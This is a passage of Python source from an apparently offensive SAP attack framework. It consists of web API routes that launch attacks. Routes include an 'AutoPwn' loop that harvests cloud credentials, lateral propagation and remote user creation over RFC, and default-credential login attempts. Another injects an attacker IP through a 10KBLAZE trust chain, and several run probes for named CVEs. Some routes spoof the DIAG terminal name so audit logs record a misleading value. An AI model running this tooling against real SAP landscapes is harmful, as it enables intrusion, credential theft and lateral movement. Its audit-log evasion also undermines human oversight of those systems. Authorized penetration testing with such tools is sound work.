                "created_at": datetime.now().isoformat(),
            }
            api.state.created_destinations.append(entry)
            state_mgr.save_created_destination(entry)

            # Test the destination with /SDF/RFC_CHECK
            print(f"[*] Testing {dest_name} with /SDF/RFC_CHECK...")
            if _td_sess is not None:
                # SOAP variant: DEST_CHECK_CONNECTION returns ping_ok
                # without the EV_PING_STATUS field.  Synthesise the
                # ping_status the downstream code expects.
                _r = _td_sess.dest_check_connection(dest_name)
                check = {"ping_status": "1" if _r["ping_ok"] else "0",
                         "logon_ok": _r["logon_ok"],
                         "ping_ok": _r["ping_ok"],
                         "error": _r["error"]}
            else:
                check = sapmap_rfc.test_rfc_destination(
                    node, dest_name, creds, api.state.rfc_check_cache
                )

            # For TCP/IP destinations, success = EV_PING_STATUS == 1
            ping_success = check.get("ping_status") == "1"

            # Create connection and add to state
            conn = RFCConnection(
                source_sid=sid,
                source_host=node.ip or node.hostname,
                target_sid=target_sid,
                target_host=tgt_host,
                target_ip=tgt_node.ip,
                destination_name=dest_name,
                logon_successful=ping_success,
                ping_ok=ping_success,
                latency_ms=check.get("latency_ms", 0),
                tested=True,
                sapxpg_remote_works=ping_success,
            )
            api.state.add_connection(conn)

            if ping_success:
                print(f"[+] {dest_name}: Ping successful! "
                      f"(EV_PING_STATUS=1, latency={conn.latency_ms}ms)")
                tgt_node.has_critical_finding = True
            else:
                print(f"[-] {dest_name}: Ping failed — "
                      f"{check.get('logon_message', check.get('error', ''))}")

        _bg(f"{sid}:create_tcpip", "Create TCP/IP Dest", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/propagate", method="POST")
    def node_propagate(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        target_sid = data.get("target_sid", None)

        def _run():
            sapmap_exploit.propagate_from_node(
                node, api.state, target_sid=target_sid
            )

        _bg(f"{sid}:propagate", "Propagate", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_user_via_rfc", method="POST")
    def node_create_user_via_rfc(sid):
        """Create a remote user on a target system via a specific RFC destination."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        dest_name = data.get("destination_name", "")
        target_sid = data.get("target_sid", "")
        if not dest_name or not target_sid:
            return json.dumps({"error": "destination_name and target_sid required"})

        def _run():
            sapmap_exploit.propagate_from_node(
                node, api.state, target_sid=target_sid,
                destination_name=dest_name
            )

        _bg(f"{sid}:create_user_rfc:{dest_name}", "Create User via RFC", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/cleanup", method="POST")
    def node_cleanup(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_cleanup.cleanup_node_users(node, api.state)

        _bg(f"{sid}:cleanup", "Cleanup Users", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_router_info", method="POST")
    def node_check_router_info(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            from sap_router_info import saprouter_info_request
            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find SAProuter port (default 3299)
            router_port = 3299
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "saprouter":
                        router_port = port
                        break

            print(f"[*] {sid}: Checking SAProuter info leak on "
                  f"{host}:{router_port}...")
            result = saprouter_info_request(host, router_port, timeout=10)
            node.saprouter_info = result

            if result["vulnerable"]:
                print(f"[+] {sid}: SAProuter is VULNERABLE to info leak!")
                print(f"    Working dir: {result['working_dir']}")
                print(f"    Routtab: {result['routtab']}")
                print(f"    Connected clients: {result['total_clients']}")
                for c in result['clients']:
                    svc = f":{c['service']}" if c.get('service') else ""
                    print(f"      [{c.get('id','')}] {c['source']} → "
                          f"{c.get('partner', '(no partner)')}{svc}")
                node.has_critical_finding = True
                sapmap_findings.emit_finding(
                    "HIGH", sid,
                    f"SAProuter info-leak succeeded on {host}:{router_port} "
                    f"— {result['total_clients']} clients, routtab exposed",
                    cve="CVE-2022-27668 (similar) / NIINFO leak",
                    attack_capability="recon.saprouter_info",
                )
            else:
                print(f"[*] {sid}: SAProuter info leak not available "
                      f"({result['error']})")

        _bg(f"{sid}:check_router_info", "Check SAProuter Info", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_snc", method="POST")
    def node_check_snc(sid):
        """Probe SNC posture for a single node.  Info only — no Finding."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            from sap_snc import (
                scan_snc_diag, scan_snc_router, format_summary,
            )
            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available for SNC probe")
                return

            is_router = "SAPROUTER" in (node.system_type or "").upper()
            probe_port = 0
            if is_router:
                for inst in node.instances:
                    for port, svc in inst.ports.items():
                        if svc == "saprouter":
                            probe_port = port
                            break
                if not probe_port:
                    probe_port = 3299
            else:
                for inst in node.instances:
                    for port, svc in inst.ports.items():
                        if svc == "dispatcher" or 3200 <= port <= 3299:
                            probe_port = port
                            break
                    if probe_port:
                        break
                if not probe_port:
                    print(f"[-] {sid}: No dispatcher port found (need 32XX "
                          f"for DIAG SNC probe)")
                    return

            print(f"[*] {sid}: Probing SNC posture on "
                  f"{'router' if is_router else 'diag'}://{host}:{probe_port}...")
            if is_router:
                node.snc_info = scan_snc_router(
                    host, probe_port, timeout=8,
                    saprouter=node.saprouter)
            else:
                node.snc_info = scan_snc_diag(
                    host, probe_port, timeout=8,
                    saprouter=node.saprouter)
            print(f"[+] {sid}: {format_summary(node.snc_info)}")

        _bg(f"{sid}:check_snc", "Check SNC Posture", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/enum_clients", method="POST")
    def node_enum_clients(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find dispatcher port (32XX)
            disp_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "dispatcher" or (3200 <= port <= 3299):
                        disp_port = port
                        break
                if disp_port:
                    break
            if not disp_port:
                print(f"[-] {sid}: No dispatcher port found (need 32XX for DIAG)")
                return

            # T2.1 — DIAG terminal-name spoof when Tier 1 detected
            # rsau/ip_only=0 on this node.
            from sapmap_evasion import (effective_diag_terminal,
                                         EvasionConfig)
            evasion = EvasionConfig.from_dict(api.state.evasion or {})
            term, spoofed = effective_diag_terminal(node, evasion)
            if spoofed:
                print(f"[*] {sid}: DIAG terminal spoof active — "
                      f"'{term}' (rsau/ip_only=0 detected)")
                emit_finding("INFO", sid,
                             f"DIAG terminal spoof: '{term}' "
                             f"(rsau/ip_only=0)")
            clients = sapmap_scanner.enumerate_system_clients(
                host, disp_port, sid_hint=node.sid,
                saprouter=node.saprouter, terminal=term)
            if clients:
                # Merge with existing clients (avoid duplicates)
                existing_nrs = set()
                for c in node.clients:
                    nr = c.get("nr") if isinstance(c, dict) else str(c)
                    existing_nrs.add(nr)
                for nr in clients:
                    if nr not in existing_nrs:
                        node.clients.append({"nr": nr, "category": ""})

        _bg(f"{sid}:enum_clients", "Enumerate Clients", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_default_creds", method="POST")
    def node_check_default_creds(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            try:
                from sap_default_creds import check_default_credentials
            except ImportError:
                print(f"[-] {sid}: sap_default_creds module not available")
                return

            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find dispatcher port (32XX)
            disp_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "dispatcher" or (3200 <= port <= 3299):
                        disp_port = port
                        break
                if disp_port:
                    break
            if not disp_port:
                print(f"[-] {sid}: No dispatcher port found (need 32XX for DIAG)")
                return

            # Get client list
            clients = []
            for c in node.clients:
                nr = c.get("nr") if isinstance(c, dict) else str(c)
                if nr:
                    clients.append(nr)
            if not clients:
                clients = ["000"]
                print(f"[*] {sid}: No clients enumerated, testing client 000 only")

            print(f"[*] {sid}: Checking default accounts on {host}:{disp_port} "
                  f"(clients: {', '.join(clients)})...")
            print(f"[!] {sid}: WARNING — failed login attempts may lock accounts!")

            if node.saprouter:
                print(f"[*] {sid}: Routing DIAG via SAProuter: {node.saprouter}")
            # T2.1 — when Tier 1 detected rsau/ip_only=0 on this node,
            # spoof the DIAG terminal-name field so SAL Source records
            # a blender value instead of "sapscanner".
            from sapmap_evasion import (effective_diag_terminal,
                                         EvasionConfig)
            evasion = EvasionConfig.from_dict(api.state.evasion or {})
            term, spoofed = effective_diag_terminal(node, evasion)
            if spoofed:
                print(f"[*] {sid}: DIAG terminal spoof active — "
                      f"'{term}' (rsau/ip_only=0 detected)")
                emit_finding("INFO", sid,
                             f"DIAG terminal spoof: '{term}' "
                             f"(rsau/ip_only=0)")
            findings = check_default_credentials(
                host, disp_port, clients, timeout=10, verbose=True,
                saprouter=node.saprouter, terminal=term)

            if findings:
                print(f"[+] {sid}: Found {len(findings)} default credential(s)!")
                for f in findings:
                    # Add as credentials on the node
                    cred = Credentials(
                        username=f["username"], password=f["password"],
                        client=f["client"],
                        instance_nr=node.instance_nrs()[0] if node.instance_nrs() else "00",
                        verified=(f["result"] == "SUCCESS"),
                    )
                    already = any(
                        c.username == cred.username and c.client == cred.client
                        for c in node.credentials
                    )
                    if not already:
                        node.credentials.append(cred)
                        print(f"    [{f['severity']}] {f['username']}:{f['password']} "
                              f"client {f['client']} — {f['detail']}")
            else:
                print(f"[*] {sid}: No default credentials found")

        _bg(f"{sid}:default_creds", "Check Default Accounts", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/client_roles", method="POST")
    def node_client_roles(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            sapmap_rfc.update_node_production_status(node, creds)

        _bg(f"{sid}:client_roles", "Client Roles", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>", method="DELETE")
    def node_delete(sid):
        response.content_type = "application/json"
        if api.state.remove_node(sid):
            print(f"[*] Removed system {sid} from the map")
            return json.dumps({"status": "ok"})
        return json.dumps({"error": f"Node {sid} not found"})

    @app.route("/api/node/add", method="POST")
    def node_add():
        response.content_type = "application/json"
        data = request.json or {}
        sid = (data.get("sid") or "").strip().upper()
        ip = (data.get("ip") or "").strip()
        inst_nr = (data.get("instance_nr") or "").strip()

        if not sid or len(sid) != 3 or not sid.isalnum():
            return json.dumps({"error": "SID must be exactly 3 alphanumeric characters"})
        if not ip:
            return json.dumps({"error": "IP/Hostname is required"})
        if not inst_nr or len(inst_nr) != 2 or not inst_nr.isdigit():
            return json.dumps({"error": "Instance number must be 2 digits (00-99)"})
        if api.state.get_node(sid):
            return json.dumps({"error": f"System {sid} already exists on the map"})

        saprouter = (data.get("saprouter") or "").strip()

        nr = inst_nr
        # Only set dispatcher/gateway ports (derived from instance nr)
        # — other ports are discovered by scanning
        ports = {
            int(f"32{nr}"): "dispatcher",
            int(f"33{nr}"): "gateway",
        }
        instance = InstanceInfo(instance_nr=nr, ip=ip, ports=ports)
        node = SAPNode(sid=sid, ip=ip, hostname=ip, instances=[instance],
                       saprouter=saprouter)
        api.state.add_node(node)
        router_msg = f", via SAProuter" if saprouter else ""
        print(f"[+] Manually added system {sid} ({ip}, instance {nr}{router_msg})")

        # Auto-enrich via RFC_SYSTEM_INFO in background
        def _enrich():
            host = node.ip or node.hostname
            gw_port = int(f"33{nr}")
            inst_nrs = [nr]
            print(f"[*] {sid}: Auto-enriching via RFC_SYSTEM_INFO...")

            def _apply(info, fill_only=False):
                # fill_only: only populate fields that are currently empty —
                # used for the sweep step so a later, lower-confidence probe
                # (e.g. product-name-based DB inference) doesn't clobber a
                # correctly-detected value from the primary probe.
                def _set(field, val):
                    if not val:
                        return
                    cur = getattr(node, field, "")
                    if fill_only and cur:
                        return
                    setattr(node, field, val)
                _set("hostname", info.get("hostname"))
                _set("os_type", info.get("os_type"))
                _set("db_type", info.get("db_type"))
                _set("kernel", info.get("kernel"))
                _set("sap_release", info.get("sap_release"))
                sc_abap = info.get("_is_abap", False)
                sc_java = info.get("_is_java", False)
                if sc_abap or sc_java:
                    new_type = ("ABAP+JAVA" if sc_abap and sc_java
                                else "JAVA" if sc_java else "ABAP")
                    if not fill_only or not node.system_type:
                        node.system_type = new_type

            try:
                info = sapmap_scanner.enrich_system_info(
                    host, gw_port, instance_nrs=inst_nrs,
                    sid_hint=sid, saprouter=saprouter)
                _apply(info)

                # For Java-only systems the user often provides the Java
                # dispatcher instance (e.g. SJJ inst 02) rather than the SCS
                # gateway instance (SJJ inst 03).  If the primary RFC_SYSTEM_INFO
                # probe didn't yield kernel/release but we did detect a stack
                # via SAPControl, sweep 33NN on the host to find an actually-
                # open gateway and re-probe RFC_SYSTEM_INFO there.
                needs_sweep = (not node.kernel or not node.sap_release)
                if needs_sweep and (info.get("_is_java") or info.get("_is_abap")):
                    import socket as _sock
                    for try_inst in range(0, 10):
                        if try_inst == int(nr):
                            continue  # already tried
                        try_port = 3300 + try_inst
                        try:
                            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                            s.settimeout(0.5)
                            s.connect((host, try_port))
                            s.close()
                        except Exception:
                            continue
                        print(f"[*] {sid}: Sweeping additional gateway at "
                              f"{host}:{try_port} for RFC_SYSTEM_INFO...")
                        sweep_info = sapmap_scanner.enrich_system_info(
                            host, try_port,
                            instance_nrs=[f"{try_inst:02d}"],
                            sid_hint=sid, saprouter=saprouter)
                        _apply(sweep_info, fill_only=True)
                        # Track the discovered gateway instance on the node
                        have_inst = any(i.instance_nr == f"{try_inst:02d}"
                                         for i in node.instances)
                        if not have_inst:
                            node.instances.append(InstanceInfo(
                                instance_nr=f"{try_inst:02d}", ip=host,
                                ports={try_port: "gateway"}))
                        if node.kernel and node.sap_release:
                            break
                parts = []
                if node.os_type:
                    parts.append(f"OS: {node.os_type}")
                if node.db_type:
                    parts.append(f"DB: {node.db_type}")
                if node.kernel:
                    parts.append(f"Kernel: {node.kernel}")
                if parts:
                    print(f"[+] {sid}: {', '.join(parts)}")
                else:
                    print(f"[*] {sid}: RFC_SYSTEM_INFO returned no data")
            except Exception as e:
                print(f"[*] {sid}: RFC_SYSTEM_INFO failed: {e}")

            # Auto-check MS internal port for betrusted vulnerability
            print(f"[*] {sid}: Checking MS internal port (CVE-2020-6207)...")
            try:
                sapmap_scanner.check_ms_betrusted(node)
                if node.ms_vulnerable:
                    print(f"[+] {sid}: MS port {node.ms_port} VULNERABLE "
                          f"— betrusted attack possible (10KBLAZE)")
                elif node.ms_port:
                    print(f"[*] {sid}: MS port {node.ms_port} reachable "
                          f"({'ACL-protected' if node.ms_acl_protected else 'open'})")
            except Exception as e:
                logger.debug(f"{sid}: MS check failed: {e}")

        _bg(f"{sid}:enrich", "Enriching via RFC_SYSTEM_INFO", _enrich)

        return json.dumps({"status": "ok"})

    # -- Default password --
    @app.route("/api/settings/password", method="GET")
    def get_password():
        response.content_type = "application/json"
        import sapmap_config
        return json.dumps({"password": sapmap_config.SAPMAP_PASSWORD})

    @app.route("/api/settings/password", method="POST")
    def set_password():
        response.content_type = "application/json"
        data = request.json or {}
        new_pwd = (data.get("password") or "").strip()
        if not new_pwd:
            return json.dumps({"error": "Password cannot be empty"})
        import sapmap_config
        sapmap_config.SAPMAP_PASSWORD = new_pwd
        # Also update legacy aliases for any code that still imports them
        sapmap_config.SAPMAP_PASSWORD_ABAP = new_pwd
        sapmap_config.SAPMAP_PASSWORD_BAPI = new_pwd
        print(f"[*] Default password changed to: {new_pwd[:3]}{'*' * (len(new_pwd)-3)}")
        return json.dumps({"status": "ok"})

    # -- Exit --
    @app.route("/api/exit", method="POST")
    def do_exit():
        response.content_type = "application/json"
        print("[*] Exit requested — shutting down ...")
        import threading
        threading.Timer(0.5, lambda: os._exit(0)).start()
        return json.dumps({"status": "ok"})

    # -- Global actions --

    # ── AutoPwn ──────────────────────────────────────────────────
    @app.route("/api/actions/autopwn", method="POST")
    def actions_autopwn():
        """Launch the full AutoPwn convergence loop.

        Accepts JSON body with optional config overrides:
          max_waves:        int   (default 5)
          include_lpe:      bool  (default false)
          include_btp:      bool  (default true — harvest BTP creds from
                                  every pwned node so cloud nodes get
                                  discovered automatically)
          scan_gw:          bool  (default true)
          scan_10kblaze:    bool  (default false — slow MS-betrusted chain)
          scan_cve_31324:   bool  (default true)
          scan_recon:       bool  (default true)
          include_icmad_detection:       bool (default true)
          include_router_info_detection: bool (default true)
        """
        response.content_type = "application/json"
        nodes = list(api.state.nodes.values())
        if not nodes:
            return json.dumps({"error": "No systems on the map"})

        data = request.json or {}
        from sapmap_autopwn import AutoPwnConfig, autopwn_run
        cfg = AutoPwnConfig(
            max_waves=int(data.get("max_waves", 5)),
            include_lpe=bool(data.get("include_lpe", False)),
            include_btp=bool(data.get("include_btp", True)),
            scan_gw=bool(data.get("scan_gw", True)),
            scan_10kblaze=bool(data.get("scan_10kblaze", False)),
            scan_cve_31324=bool(data.get("scan_cve_31324", True)),
            scan_recon=bool(data.get("scan_recon", True)),
            include_icmad_detection=bool(
                data.get("include_icmad_detection", True)),
            include_router_info_detection=bool(
                data.get("include_router_info_detection", True)),
        )

        def _run():
            autopwn_run(api.state, cfg)

        _bg("_autopwn", "AutoPwn", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/autopwn/status")
    def actions_autopwn_status():
        """Poll endpoint for AutoPwn progress."""
        response.content_type = "application/json"
        from sapmap_autopwn import get_status
        return json.dumps(get_status())

    @app.route("/api/actions/propagate_all", method="POST")
    def actions_propagate_all():
        response.content_type = "application/json"

        def _run():
            # Operator-initiated Propagate All clears the AutoPwn
            # skip-if-done flag so every pwned node gets re-processed.
            for _n in api.state.nodes.values():
                try:
                    delattr(_n, "_propagate_all_ran_at")
                except AttributeError:
                    pass
            sapmap_exploit.propagate_all(api.state)

        _bg("_propagate_all", "Propagate All", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/actions/cleanup_all", method="POST")
    def actions_cleanup_all():
        response.content_type = "application/json"

        def _run():
            sapmap_cleanup.cleanup_all_users(api.state)

        _bg("_cleanup_all", "Cleanup All", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/actions/check_all_gw", method="POST")
    def actions_check_all_gw():
        response.content_type = "application/json"
        nodes = list(api.state.nodes.values())
        if len(nodes) < 2:
            return json.dumps({"error": "Need at least 2 systems on the map"})

        def _run():
            for node in nodes:
                print(f"[*] Checking GW vulnerability: {node.sid} ({node.ip})")
                sapmap_exploit.check_gw_vulnerable(node)

        _bg("_check_all_gw", "Check All GW Vulnerabilities", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_ms", method="POST")
    def actions_check_all_ms():
        """Check MS internal port (CVE-2020-6207) on all nodes."""
        response.content_type = "application/json"
        nodes = list(api.state.nodes.values())

        def _run():
            for node in nodes:
                print(f"[*] Checking MS betrusted: {node.sid} ({node.ip})")
                sapmap_scanner.check_ms_betrusted(node)

        _bg("_check_all_ms", "Check All MS Betrusted", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_cve_31324", method="POST")
    def actions_check_all_cve_31324():
        """Probe every Java / double-stack node for CVE-2025-31324.

        Pure-ABAP nodes are skipped (the vuln lives in VisualComposer on
        the Java stack), so the loop only hits candidates where the
        check is meaningful.
        """
        response.content_type = "application/json"
        nodes = [n for n in api.state.nodes.values()
                 if "JAVA" in (n.system_type or "").upper()]
        if not nodes:
            return json.dumps({"error": "No Java / double-stack systems on "
                                         "the map"})

        def _run():
            for node in nodes:
                print(f"[*] {node.sid}: check_cve_2025_31324 "
                      f"({node.ip})")
                try:
                    sapmap_scanner.check_cve_2025_31324(node)
                except Exception as e:
                    print(f"[-] {node.sid}: check_cve_31324 failed: {e}")

        _bg("_check_all_cve_31324", "Check All CVE-2025-31324", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_cve_6287", method="POST")
    def actions_check_all_cve_6287():
        """Probe every Java / double-stack node for CVE-2020-6287 (RECON).

        RECON lives in the AS Java LM Configuration Wizard / CTC
        ConfigServlet endpoints — Java stack only.  Read-only check;
        no admin user is created (that's the separate
        `create_user_java` action).
        """
        response.content_type = "application/json"
        nodes = [n for n in api.state.nodes.values()
                 if "JAVA" in (n.system_type or "").upper()]
        if not nodes:
            return json.dumps({"error": "No Java / double-stack systems on "
                                         "the map"})

        def _run():
            for node in nodes:
                print(f"[*] {node.sid}: check_cve_2020_6287 (RECON) "
                      f"({node.ip})")
                try:
                    sapmap_scanner.check_cve_2020_6287(node)
                except Exception as e:
                    print(f"[-] {node.sid}: check_cve_6287 failed: {e}")

        _bg("_check_all_cve_6287", "Check All CVE-2020-6287 (RECON)", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_cve_22536", method="POST")
    def actions_check_all_cve_22536():
        """Probe every HTTP-serving SAP node for CVE-2022-22536 (ICMAD).

        The ICM Content-Length smuggling primitive lives in the
        SAP ICM (used by ABAP web dispatcher, Java, and dedicated
        Web Dispatcher).  Eligible: any node whose system_type
        contains ABAP / JAVA / WEB_DISPATCHER, or whose
        is_web_dispatcher flag is set.
        """
        response.content_type = "application/json"
        nodes = []
        for n in api.state.nodes.values():
            st = (n.system_type or "").upper()
            if ("ABAP" in st or "JAVA" in st
                    or "WEB_DISPATCHER" in st
                    or getattr(n, "is_web_dispatcher", False)):
                nodes.append(n)
        if not nodes:
            return json.dumps({"error": "No SAP HTTP-serving systems on "
                                         "the map (ABAP / Java / Web "
                                         "Dispatcher)"})

        def _run():
            for node in nodes:
                print(f"[*] {node.sid}: check_cve_2022_22536 (ICMAD) "
                      f"({node.ip})")
                try:
                    sapmap_scanner.check_cve_2022_22536(node)
                except Exception as e:
                    print(f"[-] {node.sid}: check_cve_22536 failed: {e}")

        _bg("_check_all_cve_22536", "Check All CVE-2022-22536 (ICMAD)", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_router_info", method="POST")
    def actions_check_all_router_info():
        """Probe every SAProuter node on the map for the ROUTER_ADM
        NIINFO leak (router responds with routtab + connected
        clients list when the NIINFO ACL is unset).

        The vulnerability lives in the SAProuter itself - probing
        non-router nodes on :3299 produces false positives when a
        SAP node shares a host with the actual router (operator-
        reported on S4D/S4H/RD1 all on 192.168.2.209).  Eligibility
        rule: system_type contains SAPROUTER OR any instance port
        is tagged 'saprouter' (rare double-up case).
        """
        response.content_type = "application/json"
        nodes = []
        for n in api.state.nodes.values():
            if "SAPROUTER" in (n.system_type or "").upper():
                nodes.append(n)
                continue
            # Edge case: a SAP node that also runs an embedded
            # SAProuter shows up as system_type=ABAP/JAVA but has
            # a 'saprouter' port in its instances dict.  Include
            # those too.
            if any(svc == "saprouter"
                     for inst in n.instances
                     for svc in inst.ports.values()):
                nodes.append(n)
        if not nodes:
            return json.dumps({"error": "No SAProuter nodes on the "
                                         "map — the info-leak check "
                                         "probes routers, not SAP "
                                         "application servers"})

        def _run():
            from sap_router_info import saprouter_info_request
            for node in nodes:
                host = node.ip or node.hostname
                if not host:
                    print(f"[-] {node.sid}: No IP/hostname available")
                    continue
                # Find SAProuter port (default 3299 if none configured)
                router_port = 3299
                for inst in node.instances:
                    for port, svc in inst.ports.items():
                        if svc == "saprouter":
                            router_port = port
                            break
                print(f"[*] {node.sid}: check_router_info on "
                      f"{host}:{router_port}...")
                try:
                    result = saprouter_info_request(host, router_port,
                                                       timeout=10)
                    node.saprouter_info = result
                    if result.get("vulnerable"):
                        print(f"[+] {node.sid}: SAProuter info-leak "
                              f"VULNERABLE — {result.get('total_clients', 0)} "
                              f"clients, routtab exposed")
                        node.has_critical_finding = True
                        sapmap_findings.emit_finding(
                            "HIGH", node.sid,
                            f"SAProuter info-leak succeeded on "
                            f"{host}:{router_port} — "
                            f"{result.get('total_clients', 0)} clients, "
                            f"routtab exposed",
                            cve="CVE-2022-27668 (similar) / NIINFO leak",
                            attack_capability="recon.saprouter_info",
                        )
                    else:
                        print(f"[*] {node.sid}: SAProuter info-leak not "
                              f"available ({result.get('error', '?')})")
                except Exception as e:
                    print(f"[-] {node.sid}: check_router_info failed: {e}")

        _bg("_check_all_router_info", "Check All SAProuter Info Leak", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_snc", method="POST")
    def actions_check_all_snc():
        """Probe SNC posture on every applicable node.

        Eligibility: SAProuter (router probe) OR any node with a dispatcher
        port (DIAG probe).  Result is info-only — recorded on
        ``node.snc_info`` and rendered in the GUI badge / report.  No
        Finding is emitted.
        """
        response.content_type = "application/json"
        targets = []
        for n in api.state.nodes.values():
            is_router = "SAPROUTER" in (n.system_type or "").upper()
            if is_router:
                targets.append((n, "router"))
                continue
            for inst in n.instances:
                if any(svc == "dispatcher" or 3200 <= p <= 3299
                       for p, svc in inst.ports.items()):
                    targets.append((n, "diag"))
                    break

        if not targets:
            return json.dumps({"error": "No nodes with dispatcher / router "
                                          "port to probe"})

        def _run():
            from sap_snc import (
                scan_snc_diag, scan_snc_router, format_summary,
            )
            for node, protocol in targets:
                host = node.ip or node.hostname
                if not host:
                    continue
                probe_port = 0
                if protocol == "router":
                    for inst in node.instances:
                        for port, svc in inst.ports.items():
                            if svc == "saprouter":
                                probe_port = port
                                break
                    if not probe_port:
                        probe_port = 3299
                else:
                    for inst in node.instances:
                        for port, svc in inst.ports.items():
                            if svc == "dispatcher" or 3200 <= port <= 3299:
                                probe_port = port
                                break
                        if probe_port:
                            break
                if not probe_port:
                    continue
                try:
                    if protocol == "router":
                        node.snc_info = scan_snc_router(
                            host, probe_port, timeout=8,
                            saprouter=node.saprouter)
                    else:
                        node.snc_info = scan_snc_diag(
                            host, probe_port, timeout=8,
                            saprouter=node.saprouter)
                    print(f"[+] {node.sid}: {format_summary(node.snc_info)}")
                except Exception as e:
                    print(f"[-] {node.sid}: check_snc failed: {e}")

        _bg("_check_all_snc", "Check All SNC Posture", _run)
        return json.dumps({"status": "started", "systems": len(targets)})

    @app.route("/api/actions/analyze_chains", method="POST")
    def actions_analyze_chains():
        """Discover RFC trust chain escalation paths across the landscape."""
        response.content_type = "application/json"

        def _run():
            import sapmap_chain
            chains = sapmap_chain.analyze_chains(api.state)
            # Store on state for retrieval
            api.state._trust_chains = [c.to_dict() for c in chains]

        _bg("_analyze_chains", "Trust Chain Analysis", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/chains")
    def get_chains():
        response.content_type = "application/json"
        chains = getattr(api.state, '_trust_chains', [])
        return json.dumps({"chains": chains})

    @app.route("/api/actions/check_all_betrusted", method="POST")
    def actions_check_all_betrusted():
        """Check MS betrusted + inject trusted IP on all nodes."""
        response.content_type = "application/json"
        data = request.json or {}
        attacker_ip = data.get("attacker_ip", "").strip()
        nodes = list(api.state.nodes.values())

        stop_event = threading.Event()
        key = "_check_all_betrusted"
        _register_betrusted_stop(key, stop_event)

        def _run():
            try:
                # Phase 1: scan all MS ports
                print(f"[*] Phase 1: Scanning MS internal ports on {len(nodes)} systems...")
                vulnerable = []
                for node in nodes:
                    if stop_event.is_set():
                        print(f"[!] Check All 10KBlaze cancelled by user")
                        return
                    if node.ms_vulnerable:
                        print(f"[+] {node.sid}: Already known MS vulnerable (port {node.ms_port})")
                        vulnerable.append(node)
                        continue
                    print(f"[*] {node.sid}: Checking MS internal port...")
                    sapmap_scanner.check_ms_betrusted(node)
                    if node.ms_vulnerable:
                        print(f"[+] {node.sid}: MS port {node.ms_port} VULNERABLE!")
                        vulnerable.append(node)

                if not vulnerable:
                    print(f"[-] No systems with vulnerable MS internal port found")
                    return

                # Phase 2: inject trusted IP on vulnerable systems
                print(f"\n[*] Phase 2: Injecting trusted IP on {len(vulnerable)} vulnerable systems...")
                for node in vulnerable:
                    if stop_event.is_set():
                        print(f"[!] Check All 10KBlaze cancelled by user")
                        return
                    print(f"[*] {node.sid}: betrusted → inject {attacker_ip or 'auto-detect'}")
                    ok = sapmap_exploit.try_betrusted_chain(
                        node, api.state,
                        attacker_ip=attacker_ip,
                        nilist_wait=30,
                        stop_event=stop_event,
                    )
                    if ok:
                        print(f"[+] {node.sid}: Gateway TRUSTED — GW exploit available!")
                    else:
                        print(f"[-] {node.sid}: betrusted did not establish trust")

                trusted = [n for n in vulnerable if n.gw_vulnerable]
                print(f"\n[*] Results: {len(vulnerable)} MS vulnerable, "
                      f"{len(trusted)} gateway trusted")
            finally:
                stop_event.set()
                _unregister_betrusted_stop(key)

        _bg(key, "Check All 10KBlaze", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_vulns", method="POST")
    def actions_check_all_vulns():
        """Run selected passive 'Check ...' probes across every node.

        The optional ``checks`` body picks which probes to run (the GUI's
        multi-select modal builds it from the operator's checkboxes).
        With no body, every check defaults on except default_creds.

        Mirrors the per-node right-click Scanning → Check * items, gated
        by the node's system_type:
          - gw            — every node
          - ms            — every node (39NN probe)
          - cve_31324     — Java / double-stack only
          - cve_6287      — Java / double-stack only
